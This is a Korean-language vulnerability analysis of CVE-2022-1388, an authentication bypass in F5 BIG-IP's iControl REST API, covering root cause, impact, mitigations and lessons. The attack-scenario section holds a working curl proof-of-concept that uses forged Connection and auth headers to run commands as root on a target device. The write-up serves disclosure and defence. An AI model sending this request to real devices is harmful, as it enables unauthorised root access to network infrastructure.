# CVE-2022-1388 - F5 BIG-IP Authentication Bypass

## 개요

| 항목 | 내용 |
|------|------|
| CVE ID | CVE-2022-1388 |
| CVSS | 9.8 (Critical) |
| 영향 소프트웨어 | F5 BIG-IP |
| 영향 버전 | 16.1.x (< 16.1.2.2), 15.1.x (< 15.1.5.1), 14.1.x (< 14.1.4.6), 13.1.x (< 13.1.5), 12.1.x, 11.6.x |
| 수정 버전 | 16.1.2.2, 15.1.5.1, 14.1.4.6, 13.1.5 |
| 공격 유형 | Authentication Bypass → RCE |
| 발견일 | 2022-05-04 |

## 영향 범위 & 심각성

F5 BIG-IP는 전 세계 대기업, 금융기관, 정부기관에서 사용하는 로드밸런서/WAF/트래픽 관리 장비다. 네트워크 경계에 위치하며 모든 트래픽을 처리하는 핵심 인프라다.

**실제 영향:**
- 공개 후 수일 내 대규모 자동화 스캔 및 익스플로잇 탐지
- CISA(미국 사이버보안청)가 긴급 지시문 발행
- 공격자가 장비 root 쉘 획득 → 내부 네트워크 전체 노출
- 로드밸런서 장악 = 뒤의 모든 서버 트래픽 도청/조작 가능
- Shodan 기준 수만 대의 BIG-IP가 인터넷에 노출된 상태

## 취약점 기술 분석

### 근본 원인

F5 BIG-IP의 iControl REST API에서 `Connection` HTTP 헤더를 조작하면 인증을 완전히 우회할 수 있다.

**메커니즘:**
1. iControl REST는 Apache → Jetty → 백엔드로 요청을 프록시
2. `Connection: X-F5-Auth-Token` 헤더를 설정하면, hop-by-hop 헤더 처리에 따라 인증 토큰 헤더가 제거됨
3. 동시에 `X-F5-Auth-Token` 값이 비어있으면 특정 코드 경로에서 인증 검증을 건너뜀
4. `Authorization: Basic` 헤더에 유효하지 않은 값을 넣어도 처리됨

### 핵심 문제

- **hop-by-hop 헤더 남용**: HTTP/1.1 스펙의 Connection 헤더 처리를 악용
- **인증 로직의 불완전한 실패 처리**: 토큰이 없을 때 안전하게 실패하지 않음
- **다중 프록시 계층의 헤더 처리 불일치**

## 공격 시나리오

### 단계별 공격

1. **대상 식별**: Shodan으로 인터넷 노출된 BIG-IP 관리 포트(443/8443) 스캔
2. **인증 우회**: 조작된 HTTP 헤더로 iControl REST API 접근
3. **명령 실행**: bash 명령을 통한 root 권한 코드 실행

```bash
# 인증 우회 후 임의 명령 실행 (교육 목적)
curl -sk -X POST "https://target/mgmt/tm/util/bash" \
  -H "Connection: X-F5-Auth-Token, X-Forwarded-Host" \
  -H "X-F5-Auth-Token: anything" \
  -H "Authorization: Basic YWRtaW46" \
  -H "Content-Type: application/json" \
  -d '{"command":"run","utilCmdArgs":"-c id"}'
```

### 공격 결과
- root 쉘 획득
- SSL 인증서, 비밀키 탈취
- 트래픽 미러링/조작
- 내부 네트워크 피벗

## 방어 방법

### 즉시 조치
1. **패치 적용**: 수정 버전으로 즉시 업그레이드
2. **관리 인터페이스 접근 제한**: Self IP의 iControl REST 접근을 신뢰된 네트워크로 제한
3. **임시 완화**: httpd 설정에서 Connection 헤더 필터링

### 장기 대책
- 관리 포트를 인터넷에 절대 노출하지 않음 (VPN/Jump Host 경유)
- 네트워크 세그멘테이션으로 관리 플레인 분리
- IDS/IPS에서 비정상 Connection 헤더 패턴 탐지 규칙 추가

```bash
# BIG-IP TMSH에서 관리 접근 제한
tmsh modify sys httpd allow { 10.0.0.0/8 }
tmsh save sys config
```

## 교훈

1. **네트워크 장비도 취약하다**: 방화벽/WAF/LB 자체가 공격 대상이 될 수 있음. 보안 장비라고 안전한 것이 아니다
2. **관리 인터페이스 노출 금지**: 어떤 장비든 관리 포트의 인터넷 노출은 치명적. 반드시 별도 관리 네트워크 사용
3. **hop-by-hop 헤더 처리 주의**: 프록시 체인에서 헤더 처리 불일치는 인증 우회로 이어질 수 있음
4. **심층 방어(Defense in Depth)**: 단일 인증 계층에 의존하면 한 번의 우회로 전체가 무너짐
5. **패치 관리 자동화**: 네트워크 어플라이언스도 소프트웨어와 동일한 수준의 패치 주기로 관리해야 함
6. **자산 가시성**: Shodan/Censys에서 자사 장비가 노출되지 않았는지 정기적으로 확인

## 참고 자료

- [NVD - CVE-2022-1388](https://nvd.nist.gov/vuln/detail/CVE-2022-1388)
- [F5 Security Advisory K23605346](https://support.f5.com/csp/article/K23605346)
- [CISA Alert AA22-138A](https://www.cisa.gov/news-events/cybersecurity-advisories/aa22-138a)
- [Horizon3.ai 기술 분석](https://www.horizon3.ai/f5-icontrol-rest-endpoint-authentication-bypass-technical-deep-dive/)
